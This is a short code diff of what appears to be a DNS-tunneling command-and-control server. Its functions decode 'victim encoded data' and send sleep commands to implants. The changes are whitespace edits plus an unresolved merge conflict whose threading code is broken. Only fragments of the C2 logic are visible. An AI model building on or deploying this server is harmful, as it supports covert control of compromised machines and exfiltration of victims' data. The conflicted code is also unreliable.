@@ -118,7 +118,6 @@ def send_command(request: DNSQR, identify: bytes, ans_code: int, enc_data: bytes
     :param enc_data: victim encoded data
     """
     global input_buffer
-
     data = decode_msg(identify, enc_data)
     # print('answer from ', identify, ' with code ', ans_code, ':\n', data)
     print(data)
@@ -229,6 +228,7 @@ def send_next_command(request: DNSQR, identify: bytes):
         print("[!]send him to sleep!")
         response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'5')
     send_response(request, response_data)
+
 
 
 # endregion
@@ -411,4 +411,14 @@ def main():
 
 
 if __name__ == "__main__":
+<<<<<<< HEAD
     main()
+=======
+    t1 = Thread(target=run)
+    t1.start()
+    while(True):
+        with mutex:
+            input_buffer = raw_input();
+            mutex.acquire()
+        input_buffer = ""
+>>>>>>> 3d18940f789202eee1f4f6056c5449242ecc47d2
